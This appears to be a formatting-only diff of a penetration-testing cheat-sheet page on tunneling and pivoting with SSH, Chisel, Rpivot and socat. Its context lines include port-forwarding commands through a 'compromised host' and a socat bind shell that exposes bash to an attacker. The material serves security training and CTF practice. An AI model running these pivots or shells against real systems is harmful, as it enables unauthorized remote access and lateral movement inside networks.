@@ -27,7 +27,7 @@ Local port --&gt; Compromised host \(SSH\) --&gt; Third\_box:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host 
 #Example
-sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised> 
+sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 
 ### Port2hostnet \(proxychains\)
@@ -121,9 +121,9 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 
 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 
-Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance.
+Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go \(golang\). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance.
 
-You can do port forwarding (bind & reverse), create a socks proxy (bind & reverse).
+You can do port forwarding \(bind & reverse\), create a socks proxy \(bind & reverse\).
 
 ```bash
 root@kali:/opt# git clone https://github.com/jpillora/chisel.git
@@ -152,10 +152,11 @@ root@kali:/opt/chisel# ./chisel --help
 ![](https://0xdf.gitlab.io/img/chisel-2.webp)
 
 Read more:
-- https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html (Blog by Oxdf)
-- https://github.com/jpillora/chisel
-- https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s (HTB Reddish by ippsec)
-- https://0xdf.gitlab.io/2019/01/26/htb-reddish.html (HTB Reddish by 0xdf)
+
+* [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) \(Blog by Oxdf\)
+* [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+* [https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s) \(HTB Reddish by ippsec\)
+* [https://0xdf.gitlab.io/2019/01/26/htb-reddish.html](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html) \(HTB Reddish by 0xdf\)
 
 ## Rpivot
 
@@ -190,7 +191,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
-attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337 
+attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
 
 ### Reverse shell
@@ -232,7 +233,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-###  SSL Socat Tunnel
+### SSL Socat Tunnel
 
 **/bin/sh console**
 
@@ -286,7 +287,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
- It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.  
+It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.  
 Example that forward port 443
 
 ```text
